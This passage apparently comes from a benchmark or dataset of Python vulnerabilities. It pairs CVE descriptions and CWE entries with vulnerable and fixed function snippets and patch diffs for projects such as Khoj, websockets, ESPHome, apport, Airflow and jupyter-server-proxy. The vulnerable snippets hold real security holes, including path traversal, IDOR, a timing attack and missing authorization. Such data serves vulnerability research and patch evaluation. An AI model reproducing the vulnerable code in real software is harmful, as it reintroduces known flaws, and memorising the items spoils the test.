    "vul_patch": "--- a/lib/galaxy/web/framework/middleware/static.py\n+++ b/lib/galaxy/web/framework/middleware/static.py\n@@ -22,7 +22,11 @@\n                     directory = host_val\n                     break\n \n-        full = os.path.join(directory, filename)\n+        full = self.normpath(os.path.join(directory, filename))\n+        if not full.startswith(directory):\n+            # Out of bounds\n+            return self.not_found(environ, start_response)\n+\n         if not os.path.exists(full):\n             return self.not_found(environ, start_response)\n         if os.path.isdir(full):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-52294",
    "cve_description": "Khoj is a self-hostable artificial intelligence app. Prior to version 1.29.10, an Insecure Direct Object Reference (IDOR) vulnerability in the update_subscription endpoint allows any authenticated user to manipulate other users' Stripe subscriptions by simply modifying the email parameter in the request. The vulnerability exists in the subscription endpoint at `/api/subscription`. The endpoint uses an email parameter as a direct reference to user subscriptions without verifying object ownership. While authentication is required, there is no authorization check to verify if the authenticated user owns the referenced subscription. The issue was fixed in version 1.29.10. Support for arbitrarily presenting an email for update has been deprecated.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/khoj-ai/khoj",
    "patch_url": [
      "https://github.com/khoj-ai/khoj/commit/47d3c8c23597900af708bdc60aced3ae5d2064c1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_286_1",
        "commit": "d702710",
        "file_path": "src/khoj/routers/api_subscription.py",
        "start_line": 97,
        "end_line": 120,
        "snippet": "async def update_subscription(request: Request, email: str, operation: str):\n    # Retrieve the customer's details\n    customers = stripe.Customer.list(email=email).auto_paging_iter()\n    customer = next(customers, None)\n    if customer is None:\n        return {\"success\": False, \"message\": \"Customer not found\"}\n\n    if operation == \"cancel\":\n        customer_id = customer.id\n        for subscription in stripe.Subscription.list(customer=customer_id):\n            stripe.Subscription.modify(subscription.id, cancel_at_period_end=True)\n        return {\"success\": True}\n\n    elif operation == \"resubscribe\":\n        subscriptions = stripe.Subscription.list(customer=customer.id).auto_paging_iter()\n        # Find the subscription that is set to cancel at the end of the period\n        for subscription in subscriptions:\n            if subscription.cancel_at_period_end:\n                # Update the subscription to not cancel at the end of the period\n                stripe.Subscription.modify(subscription.id, cancel_at_period_end=False)\n                return {\"success\": True}\n        return {\"success\": False, \"message\": \"No subscription found that is set to cancel\"}\n\n    return {\"success\": False, \"message\": \"Invalid operation\"}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_286_1",
        "commit": "47d3c8c23597900af708bdc60aced3ae5d2064c1",
        "file_path": "src/khoj/routers/api_subscription.py",
        "start_line": 97,
        "end_line": 121,
        "snippet": "async def update_subscription(request: Request, operation: str):\n    # Retrieve the customer's details\n    email = request.user.object.email\n    customers = stripe.Customer.list(email=email).auto_paging_iter()\n    customer = next(customers, None)\n    if customer is None:\n        return {\"success\": False, \"message\": \"Customer not found\"}\n\n    if operation == \"cancel\":\n        customer_id = customer.id\n        for subscription in stripe.Subscription.list(customer=customer_id):\n            stripe.Subscription.modify(subscription.id, cancel_at_period_end=True)\n        return {\"success\": True}\n\n    elif operation == \"resubscribe\":\n        subscriptions = stripe.Subscription.list(customer=customer.id).auto_paging_iter()\n        # Find the subscription that is set to cancel at the end of the period\n        for subscription in subscriptions:\n            if subscription.cancel_at_period_end:\n                # Update the subscription to not cancel at the end of the period\n                stripe.Subscription.modify(subscription.id, cancel_at_period_end=False)\n                return {\"success\": True}\n        return {\"success\": False, \"message\": \"No subscription found that is set to cancel\"}\n\n    return {\"success\": False, \"message\": \"Invalid operation\"}"
      }
    ],
    "vul_patch": "--- a/src/khoj/routers/api_subscription.py\n+++ b/src/khoj/routers/api_subscription.py\n@@ -1,5 +1,6 @@\n-async def update_subscription(request: Request, email: str, operation: str):\n+async def update_subscription(request: Request, operation: str):\n     # Retrieve the customer's details\n+    email = request.user.object.email\n     customers = stripe.Customer.list(email=email).auto_paging_iter()\n     customer = next(customers, None)\n     if customer is None:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-33880",
    "cve_description": "The aaugustin websockets library before 9.1 for Python has an Observable Timing Discrepancy on servers when HTTP Basic Authentication is enabled with basic_auth_protocol_factory(credentials=...). An attacker may be able to guess a password via a timing attack.",
    "cwe_info": {
      "CWE-203": {
        "name": "Observable Discrepancy",
        "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
      }
    },
    "repo": "https://github.com/aaugustin/websockets",
    "patch_url": [
      "https://github.com/aaugustin/websockets/commit/547a26b685d08cac0aa64e5e65f7867ac0ea9bc0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_418_1",
        "commit": "a14226a",
        "file_path": "src/websockets/legacy/auth.py",
        "start_line": 86,
        "end_line": 162,
        "snippet": "def basic_auth_protocol_factory(\n    realm: str,\n    credentials: Optional[Union[Credentials, Iterable[Credentials]]] = None,\n    check_credentials: Optional[Callable[[str, str], Awaitable[bool]]] = None,\n    create_protocol: Optional[Callable[[Any], BasicAuthWebSocketServerProtocol]] = None,\n) -> Callable[[Any], BasicAuthWebSocketServerProtocol]:\n    \"\"\"\n    Protocol factory that enforces HTTP Basic Auth.\n\n    ``basic_auth_protocol_factory`` is designed to integrate with\n    :func:`~websockets.legacy.server.serve` like this::\n\n        websockets.serve(\n            ...,\n            create_protocol=websockets.basic_auth_protocol_factory(\n                realm=\"my dev server\",\n                credentials=(\"hello\", \"iloveyou\"),\n            )\n        )\n\n    ``realm`` indicates the scope of protection. It should contain only ASCII\n    characters because the encoding of non-ASCII characters is undefined.\n    Refer to section 2.2 of :rfc:`7235` for details.\n\n    ``credentials`` defines hard coded authorized credentials. It can be a\n    ``(username, password)`` pair or a list of such pairs.\n\n    ``check_credentials`` defines a coroutine that checks whether credentials\n    are authorized. This coroutine receives ``username`` and ``password``\n    arguments and returns a :class:`bool`.\n\n    One of ``credentials`` or ``check_credentials`` must be provided but not\n    both.\n\n    By default, ``basic_auth_protocol_factory`` creates a factory for building\n    :class:`BasicAuthWebSocketServerProtocol` instances. You can override this\n    with the ``create_protocol`` parameter.\n\n    :param realm: scope of protection\n    :param credentials: hard coded credentials\n    :param check_credentials: coroutine that verifies credentials\n    :raises TypeError: if the credentials argument has the wrong type\n\n    \"\"\"\n    if (credentials is None) == (check_credentials is None):\n        raise TypeError(\"provide either credentials or check_credentials\")\n\n    if credentials is not None:\n        if is_credentials(credentials):\n\n            async def check_credentials(username: str, password: str) -> bool:\n                return (username, password) == credentials\n\n        elif isinstance(credentials, Iterable):\n            credentials_list = list(credentials)\n            if all(is_credentials(item) for item in credentials_list):\n                credentials_dict = dict(credentials_list)\n\n                async def check_credentials(username: str, password: str) -> bool:\n                    return credentials_dict.get(username) == password\n\n            else:\n                raise TypeError(f\"invalid credentials argument: {credentials}\")\n\n        else:\n            raise TypeError(f\"invalid credentials argument: {credentials}\")\n\n    if create_protocol is None:\n        # Not sure why mypy cannot figure this out.\n        create_protocol = cast(\n            Callable[[Any], BasicAuthWebSocketServerProtocol],\n            BasicAuthWebSocketServerProtocol,\n        )\n\n    return functools.partial(\n        create_protocol, realm=realm, check_credentials=check_credentials\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_418_1",
        "commit": "547a26b685d08cac0aa64e5e65f7867ac0ea9bc0",
        "file_path": "src/websockets/legacy/auth.py",
        "start_line": 87,
        "end_line": 164,
        "snippet": "def basic_auth_protocol_factory(\n    realm: str,\n    credentials: Optional[Union[Credentials, Iterable[Credentials]]] = None,\n    check_credentials: Optional[Callable[[str, str], Awaitable[bool]]] = None,\n    create_protocol: Optional[Callable[[Any], BasicAuthWebSocketServerProtocol]] = None,\n) -> Callable[[Any], BasicAuthWebSocketServerProtocol]:\n    \"\"\"\n    Protocol factory that enforces HTTP Basic Auth.\n\n    ``basic_auth_protocol_factory`` is designed to integrate with\n    :func:`~websockets.legacy.server.serve` like this::\n\n        websockets.serve(\n            ...,\n            create_protocol=websockets.basic_auth_protocol_factory(\n                realm=\"my dev server\",\n                credentials=(\"hello\", \"iloveyou\"),\n            )\n        )\n\n    ``realm`` indicates the scope of protection. It should contain only ASCII\n    characters because the encoding of non-ASCII characters is undefined.\n    Refer to section 2.2 of :rfc:`7235` for details.\n\n    ``credentials`` defines hard coded authorized credentials. It can be a\n    ``(username, password)`` pair or a list of such pairs.\n\n    ``check_credentials`` defines a coroutine that checks whether credentials\n    are authorized. This coroutine receives ``username`` and ``password``\n    arguments and returns a :class:`bool`.\n\n    One of ``credentials`` or ``check_credentials`` must be provided but not\n    both.\n\n    By default, ``basic_auth_protocol_factory`` creates a factory for building\n    :class:`BasicAuthWebSocketServerProtocol` instances. You can override this\n    with the ``create_protocol`` parameter.\n\n    :param realm: scope of protection\n    :param credentials: hard coded credentials\n    :param check_credentials: coroutine that verifies credentials\n    :raises TypeError: if the credentials argument has the wrong type\n\n    \"\"\"\n    if (credentials is None) == (check_credentials is None):\n        raise TypeError(\"provide either credentials or check_credentials\")\n\n    if credentials is not None:\n        if is_credentials(credentials):\n            credentials_list = [cast(Credentials, credentials)]\n        elif isinstance(credentials, Iterable):\n            credentials_list = list(credentials)\n            if not all(is_credentials(item) for item in credentials_list):\n                raise TypeError(f\"invalid credentials argument: {credentials}\")\n        else:\n            raise TypeError(f\"invalid credentials argument: {credentials}\")\n\n        credentials_dict = dict(credentials_list)\n\n        async def check_credentials(username: str, password: str) -> bool:\n            try:\n                expected_password = credentials_dict[username]\n            except KeyError:\n                return False\n            return hmac.compare_digest(expected_password, password)\n\n    if create_protocol is None:\n        # Not sure why mypy cannot figure this out.\n        create_protocol = cast(\n            Callable[[Any], BasicAuthWebSocketServerProtocol],\n            BasicAuthWebSocketServerProtocol,\n        )\n\n    return functools.partial(\n        create_protocol,\n        realm=realm,\n        check_credentials=check_credentials,\n    )"
      }
    ],
    "vul_patch": "--- a/src/websockets/legacy/auth.py\n+++ b/src/websockets/legacy/auth.py\n@@ -47,23 +47,22 @@\n \n     if credentials is not None:\n         if is_credentials(credentials):\n-\n-            async def check_credentials(username: str, password: str) -> bool:\n-                return (username, password) == credentials\n-\n+            credentials_list = [cast(Credentials, credentials)]\n         elif isinstance(credentials, Iterable):\n             credentials_list = list(credentials)\n-            if all(is_credentials(item) for item in credentials_list):\n-                credentials_dict = dict(credentials_list)\n-\n-                async def check_credentials(username: str, password: str) -> bool:\n-                    return credentials_dict.get(username) == password\n-\n-            else:\n+            if not all(is_credentials(item) for item in credentials_list):\n                 raise TypeError(f\"invalid credentials argument: {credentials}\")\n-\n         else:\n             raise TypeError(f\"invalid credentials argument: {credentials}\")\n+\n+        credentials_dict = dict(credentials_list)\n+\n+        async def check_credentials(username: str, password: str) -> bool:\n+            try:\n+                expected_password = credentials_dict[username]\n+            except KeyError:\n+                return False\n+            return hmac.compare_digest(expected_password, password)\n \n     if create_protocol is None:\n         # Not sure why mypy cannot figure this out.\n@@ -73,5 +72,7 @@\n         )\n \n     return functools.partial(\n-        create_protocol, realm=realm, check_credentials=check_credentials\n+        create_protocol,\n+        realm=realm,\n+        check_credentials=check_credentials,\n     )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-27081",
    "cve_description": "ESPHome is a system to control your ESP8266/ESP32. A security misconfiguration in the edit configuration file API in the dashboard component of ESPHome version 2023.12.9 (command line installation) allows authenticated remote attackers to read and write arbitrary files under the configuration directory rendering remote code execution possible.  This vulnerability is patched in 2024.2.1.\n",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/esphome/esphome",
    "patch_url": [
      "https://github.com/esphome/esphome/commit/d814ed1d4adc71fde47c4df41215bee449884513"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_152_1",
        "commit": "84c6e52",
        "file_path": "esphome/dashboard/web_server.py",
        "start_line": 807,
        "end_line": 815,
        "snippet": "    async def get(self, configuration: str | None = None) -> None:\n        \"\"\"Get the content of a file.\"\"\"\n        loop = asyncio.get_running_loop()\n        filename = settings.rel_path(configuration)\n        content = await loop.run_in_executor(\n            None, self._read_file, filename, configuration\n        )\n        if content is not None:\n            self.write(content)"
      },
      {
        "id": "vul_py_152_2",
        "commit": "84c6e52",
        "file_path": "esphome/dashboard/web_server.py",
        "start_line": 834,
        "end_line": 843,
        "snippet": "    async def post(self, configuration: str | None = None) -> None:\n        \"\"\"Write the content of a file.\"\"\"\n        loop = asyncio.get_running_loop()\n        config_file = settings.rel_path(configuration)\n        await loop.run_in_executor(\n            None, self._write_file, config_file, self.request.body\n        )\n        # Ensure the StorageJSON is updated as well\n        DASHBOARD.entries.async_schedule_storage_json_update(filename)\n        self.set_status(200)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_152_1",
        "commit": "d814ed1",
        "file_path": "esphome/dashboard/web_server.py",
        "start_line": 807,
        "end_line": 823,
        "snippet": "    async def get(self, configuration: str | None = None) -> None:\n        \"\"\"Get the content of a file.\"\"\"\n        if not configuration.endswith((\".yaml\", \".yml\")):\n            self.send_error(404)\n            return\n\n        filename = settings.rel_path(configuration)\n        if Path(filename).resolve().parent != settings.absolute_config_dir:\n            self.send_error(404)\n            return\n\n        loop = asyncio.get_running_loop()\n        content = await loop.run_in_executor(\n            None, self._read_file, filename, configuration\n        )\n        if content is not None:\n            self.write(content)"
      },
      {
        "id": "fix_py_152_2",
        "commit": "d814ed1",
        "file_path": "esphome/dashboard/web_server.py",
        "start_line": 842,
        "end_line": 857,
        "snippet": "    async def post(self, configuration: str | None = None) -> None:\n        \"\"\"Write the content of a file.\"\"\"\n        if not configuration.endswith((\".yaml\", \".yml\")):\n            self.send_error(404)\n            return\n\n        filename = settings.rel_path(configuration)\n        if Path(filename).resolve().parent != settings.absolute_config_dir:\n            self.send_error(404)\n            return\n\n        loop = asyncio.get_running_loop()\n        await loop.run_in_executor(None, self._write_file, filename, self.request.body)\n        # Ensure the StorageJSON is updated as well\n        DASHBOARD.entries.async_schedule_storage_json_update(filename)\n        self.set_status(200)"
      }
    ],
    "vul_patch": "--- a/esphome/dashboard/web_server.py\n+++ b/esphome/dashboard/web_server.py\n@@ -1,7 +1,15 @@\n     async def get(self, configuration: str | None = None) -> None:\n         \"\"\"Get the content of a file.\"\"\"\n+        if not configuration.endswith((\".yaml\", \".yml\")):\n+            self.send_error(404)\n+            return\n+\n+        filename = settings.rel_path(configuration)\n+        if Path(filename).resolve().parent != settings.absolute_config_dir:\n+            self.send_error(404)\n+            return\n+\n         loop = asyncio.get_running_loop()\n-        filename = settings.rel_path(configuration)\n         content = await loop.run_in_executor(\n             None, self._read_file, filename, configuration\n         )\n\n--- a/esphome/dashboard/web_server.py\n+++ b/esphome/dashboard/web_server.py\n@@ -1,10 +1,16 @@\n     async def post(self, configuration: str | None = None) -> None:\n         \"\"\"Write the content of a file.\"\"\"\n+        if not configuration.endswith((\".yaml\", \".yml\")):\n+            self.send_error(404)\n+            return\n+\n+        filename = settings.rel_path(configuration)\n+        if Path(filename).resolve().parent != settings.absolute_config_dir:\n+            self.send_error(404)\n+            return\n+\n         loop = asyncio.get_running_loop()\n-        config_file = settings.rel_path(configuration)\n-        await loop.run_in_executor(\n-            None, self._write_file, config_file, self.request.body\n-        )\n+        await loop.run_in_executor(None, self._write_file, filename, self.request.body)\n         # Ensure the StorageJSON is updated as well\n         DASHBOARD.entries.async_schedule_storage_json_update(filename)\n         self.set_status(200)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-1326",
    "cve_description": "A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.",
    "cwe_info": {
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/canonical/apport",
    "patch_url": [
      "https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_227_1",
        "commit": "ee3e896",
        "file_path": "apport/ui.py",
        "start_line": 122,
        "end_line": 152,
        "snippet": "def run_as_real_user(args: list[str]) -> None:\n    \"\"\"Call subprocess.run as real user if called via sudo/pkexec.\n\n    If we are called through pkexec/sudo, determine the real user ID and\n    run the command with it to get the user's web browser settings.\n    \"\"\"\n    uid = _get_env_int(\"SUDO_UID\", _get_env_int(\"PKEXEC_UID\"))\n    if uid is None or not get_process_user_and_group().is_root():\n        subprocess.run(args, check=False)\n        return\n\n    pwuid = pwd.getpwuid(uid)\n\n    gid = _get_env_int(\"SUDO_GID\")\n    if gid is None:\n        gid = pwuid.pw_gid\n\n    env = {\n        k: v\n        for k, v in os.environ.items()\n        if not k.startswith(\"SUDO_\") and k != \"PKEXEC_UID\"\n    } | _get_users_environ(uid)\n    env[\"HOME\"] = pwuid.pw_dir\n    subprocess.run(\n        args,\n        check=False,\n        env=env,\n        user=uid,\n        group=gid,\n        extra_groups=os.getgrouplist(pwuid.pw_name, gid),\n    )"
      },
      {
        "id": "vul_py_227_2",
        "commit": "ee3e896",
        "file_path": "bin/apport-cli",
        "start_line": 184,
        "end_line": 200,
        "snippet": "    def ui_update_view(self, stdout=None):\n        self.in_update_view = True\n        report = self._get_details()\n        try:\n            subprocess.run(\n                [\"/usr/bin/sensible-pager\"],\n                check=False,\n                input=report.encode(\"UTF-8\"),\n                stdout=stdout,\n            )\n        except OSError as error:\n            # ignore broken pipe (premature quit)\n            if error.errno == errno.EPIPE:\n                pass\n            else:\n                raise\n        self.in_update_view = False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_227_1",
        "commit": "e5f78cc",
        "file_path": "apport/ui.py",
        "start_line": 122,
        "end_line": 159,
        "snippet": "def run_as_real_user(\n    args: list[str], *, get_user_env: bool = False, **kwargs\n) -> None:\n    \"\"\"Call subprocess.run as real user if called via sudo/pkexec.\n\n    If we are called through pkexec/sudo, determine the real user ID and\n    run the command with it to get the user's web browser settings.\n    If get_user_env is set to True, the D-BUS address and XDG_DATA_DIRS\n    is grabbed from a running gvfsd and added to the process environment.\n    \"\"\"\n    uid = _get_env_int(\"SUDO_UID\", _get_env_int(\"PKEXEC_UID\"))\n    if uid is None or not get_process_user_and_group().is_root():\n        subprocess.run(args, check=False, **kwargs)\n        return\n\n    pwuid = pwd.getpwuid(uid)\n\n    gid = _get_env_int(\"SUDO_GID\")\n    if gid is None:\n        gid = pwuid.pw_gid\n\n    env = {\n        k: v\n        for k, v in os.environ.items()\n        if not k.startswith(\"SUDO_\") and k != \"PKEXEC_UID\"\n    }\n    if get_user_env:\n        env |= _get_users_environ(uid)\n    env[\"HOME\"] = pwuid.pw_dir\n    subprocess.run(\n        args,\n        check=False,\n        env=env,\n        user=uid,\n        group=gid,\n        extra_groups=os.getgrouplist(pwuid.pw_name, gid),\n        **kwargs,\n    )"
      },
      {
        "id": "fix_py_227_2",
        "commit": "e5f78cc",
        "file_path": "bin/apport-cli",
        "start_line": 184,
        "end_line": 199,
        "snippet": "    def ui_update_view(self, stdout=None):\n        self.in_update_view = True\n        report = self._get_details()\n        try:\n            apport.ui.run_as_real_user(\n                [\"/usr/bin/sensible-pager\"],\n                input=report.encode(\"UTF-8\"),\n                stdout=stdout,\n            )\n        except OSError as error:\n            # ignore broken pipe (premature quit)\n            if error.errno == errno.EPIPE:\n                pass\n            else:\n                raise\n        self.in_update_view = False"
      }
    ],
    "vul_patch": "--- a/apport/ui.py\n+++ b/apport/ui.py\n@@ -1,12 +1,16 @@\n-def run_as_real_user(args: list[str]) -> None:\n+def run_as_real_user(\n+    args: list[str], *, get_user_env: bool = False, **kwargs\n+) -> None:\n     \"\"\"Call subprocess.run as real user if called via sudo/pkexec.\n \n     If we are called through pkexec/sudo, determine the real user ID and\n     run the command with it to get the user's web browser settings.\n+    If get_user_env is set to True, the D-BUS address and XDG_DATA_DIRS\n+    is grabbed from a running gvfsd and added to the process environment.\n     \"\"\"\n     uid = _get_env_int(\"SUDO_UID\", _get_env_int(\"PKEXEC_UID\"))\n     if uid is None or not get_process_user_and_group().is_root():\n-        subprocess.run(args, check=False)\n+        subprocess.run(args, check=False, **kwargs)\n         return\n \n     pwuid = pwd.getpwuid(uid)\n@@ -19,7 +23,9 @@\n         k: v\n         for k, v in os.environ.items()\n         if not k.startswith(\"SUDO_\") and k != \"PKEXEC_UID\"\n-    } | _get_users_environ(uid)\n+    }\n+    if get_user_env:\n+        env |= _get_users_environ(uid)\n     env[\"HOME\"] = pwuid.pw_dir\n     subprocess.run(\n         args,\n@@ -28,4 +34,5 @@\n         user=uid,\n         group=gid,\n         extra_groups=os.getgrouplist(pwuid.pw_name, gid),\n+        **kwargs,\n     )\n\n--- a/bin/apport-cli\n+++ b/bin/apport-cli\n@@ -2,9 +2,8 @@\n         self.in_update_view = True\n         report = self._get_details()\n         try:\n-            subprocess.run(\n+            apport.ui.run_as_real_user(\n                 [\"/usr/bin/sensible-pager\"],\n-                check=False,\n                 input=report.encode(\"UTF-8\"),\n                 stdout=stdout,\n             )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-50944",
    "cve_description": "Apache Airflow, versions before 2.8.1, have a vulnerability that allows an authenticated user to access the source code of a DAG to which they don't have access.\u00a0This vulnerability is considered low since it requires an authenticated user to exploit it. Users are recommended to upgrade to version 2.8.1, which fixes this issue.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/8d76538d6e105947272b000581c6fabec20146b1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_308_1",
        "commit": "1180255",
        "file_path": "airflow/api_connexion/endpoints/dag_source_endpoint.py",
        "start_line": 32,
        "end_line": 48,
        "snippet": "def get_dag_source(*, file_token: str) -> Response:\n    \"\"\"Get source code using file token.\"\"\"\n    secret_key = current_app.config[\"SECRET_KEY\"]\n    auth_s = URLSafeSerializer(secret_key)\n    try:\n        path = auth_s.loads(file_token)\n        dag_source = DagCode.code(path)\n    except (BadSignature, FileNotFoundError):\n        raise NotFound(\"Dag source not found\")\n\n    return_type = request.accept_mimetypes.best_match([\"text/plain\", \"application/json\"])\n    if return_type == \"text/plain\":\n        return Response(dag_source, headers={\"Content-Type\": return_type})\n    if return_type == \"application/json\":\n        content = dag_source_schema.dumps({\"content\": dag_source})\n        return Response(content, headers={\"Content-Type\": return_type})\n    return Response(\"Not Allowed Accept Header\", status=HTTPStatus.NOT_ACCEPTABLE)"
      },
      {
        "id": "vul_py_308_2",
        "commit": "1180255",
        "file_path": "airflow/models/dagcode.py",
        "start_line": 180,
        "end_line": 185,
        "snippet": "    def code(cls, fileloc) -> str:\n        \"\"\"Return source code for this DagCode object.\n\n        :return: source code as string\n        \"\"\"\n        return cls._get_code_from_db(fileloc)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_308_1",
        "commit": "8d76538d6e105947272b000581c6fabec20146b1",
        "file_path": "airflow/api_connexion/endpoints/dag_source_endpoint.py",
        "start_line": 39,
        "end_line": 61,
        "snippet": "@provide_session\ndef get_dag_source(*, file_token: str, session: Session = NEW_SESSION) -> Response:\n    \"\"\"Get source code using file token.\"\"\"\n    secret_key = current_app.config[\"SECRET_KEY\"]\n    auth_s = URLSafeSerializer(secret_key)\n    try:\n        path = auth_s.loads(file_token)\n        dag_ids = session.query(DagModel.dag_id).filter(DagModel.fileloc == path).all()\n        readable_dags = get_readable_dags()\n        # Check if user has read access to all the DAGs defined in the file\n        if any(dag_id[0] not in readable_dags for dag_id in dag_ids):\n            raise PermissionDenied()\n        dag_source = DagCode.code(path, session=session)\n    except (BadSignature, FileNotFoundError):\n        raise NotFound(\"Dag source not found\")\n\n    return_type = request.accept_mimetypes.best_match([\"text/plain\", \"application/json\"])\n    if return_type == \"text/plain\":\n        return Response(dag_source, headers={\"Content-Type\": return_type})\n    if return_type == \"application/json\":\n        content = dag_source_schema.dumps({\"content\": dag_source})\n        return Response(content, headers={\"Content-Type\": return_type})\n    return Response(\"Not Allowed Accept Header\", status=HTTPStatus.NOT_ACCEPTABLE)"
      },
      {
        "id": "fix_py_308_2",
        "commit": "8d76538d6e105947272b000581c6fabec20146b1",
        "file_path": "airflow/models/dagcode.py",
        "start_line": 180,
        "end_line": 186,
        "snippet": "    @provide_session\n    def code(cls, fileloc, session: Session = NEW_SESSION) -> str:\n        \"\"\"Return source code for this DagCode object.\n\n        :return: source code as string\n        \"\"\"\n        return cls._get_code_from_db(fileloc, session)"
      }
    ],
    "vul_patch": "--- a/airflow/api_connexion/endpoints/dag_source_endpoint.py\n+++ b/airflow/api_connexion/endpoints/dag_source_endpoint.py\n@@ -1,10 +1,16 @@\n-def get_dag_source(*, file_token: str) -> Response:\n+@provide_session\n+def get_dag_source(*, file_token: str, session: Session = NEW_SESSION) -> Response:\n     \"\"\"Get source code using file token.\"\"\"\n     secret_key = current_app.config[\"SECRET_KEY\"]\n     auth_s = URLSafeSerializer(secret_key)\n     try:\n         path = auth_s.loads(file_token)\n-        dag_source = DagCode.code(path)\n+        dag_ids = session.query(DagModel.dag_id).filter(DagModel.fileloc == path).all()\n+        readable_dags = get_readable_dags()\n+        # Check if user has read access to all the DAGs defined in the file\n+        if any(dag_id[0] not in readable_dags for dag_id in dag_ids):\n+            raise PermissionDenied()\n+        dag_source = DagCode.code(path, session=session)\n     except (BadSignature, FileNotFoundError):\n         raise NotFound(\"Dag source not found\")\n \n\n--- a/airflow/models/dagcode.py\n+++ b/airflow/models/dagcode.py\n@@ -1,6 +1,7 @@\n-    def code(cls, fileloc) -> str:\n+    @provide_session\n+    def code(cls, fileloc, session: Session = NEW_SESSION) -> str:\n         \"\"\"Return source code for this DagCode object.\n \n         :return: source code as string\n         \"\"\"\n-        return cls._get_code_from_db(fileloc)\n+        return cls._get_code_from_db(fileloc, session)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-21697",
    "cve_description": "Jupyter Server Proxy is a Jupyter notebook server extension to proxy web services. Versions of Jupyter Server Proxy prior to 3.2.1 are vulnerable to Server-Side Request Forgery (SSRF). Any user deploying Jupyter Server or Notebook with jupyter-proxy-server extension enabled is affected. A lack of input validation allows authenticated clients to proxy requests to other hosts, bypassing the `allowed_hosts` check. Because authentication is required, which already grants permissions to make the same requests via kernel or terminal execution, this is considered low to moderate severity. Users may upgrade to version 3.2.1 to receive a patch or, as a workaround, install the patch manually.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/jupyterhub/jupyter-server-proxy",
    "patch_url": [
      "https://github.com/jupyterhub/jupyter-server-proxy/commit/fd31930bacd12188c448c886e0783529436b99eb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_186_1",
        "commit": "8610a3b",
        "file_path": "jupyter_server_proxy/handlers.py",
        "start_line": 211,
        "end_line": 236,
        "snippet": "    def get_client_uri(self, protocol, host, port, proxied_path):\n        context_path = self._get_context_path(host, port)\n        if self.absolute_url:\n            client_path = url_path_join(context_path, proxied_path)\n        else:\n            client_path = proxied_path\n\n        # Quote spaces, \\u00e5\\u00e4\\u00f6 and such, but only enough to send a valid web\n        # request onwards. To do this, we mark the RFC 3986 specs' \"reserved\"\n        # and \"un-reserved\" characters as safe that won't need quoting. The\n        # un-reserved need to be marked safe to ensure the quote function behave\n        # the same in py36 as py37.\n        #\n        # ref: https://tools.ietf.org/html/rfc3986#section-2.2\n        client_path = quote(client_path, safe=\":/?#[]@!$&'()*+,;=-._~\")\n\n        client_uri = '{protocol}://{host}:{port}{path}'.format(\n            protocol=protocol,\n            host=host,\n            port=port,\n            path=client_path\n        )\n        if self.request.query:\n            client_uri += '?' + self.request.query\n\n        return client_uri"
      },
      {
        "id": "vul_py_186_2",
        "commit": "8610a3b",
        "file_path": "jupyter_server_proxy/handlers.py",
        "start_line": 688,
        "end_line": 738,
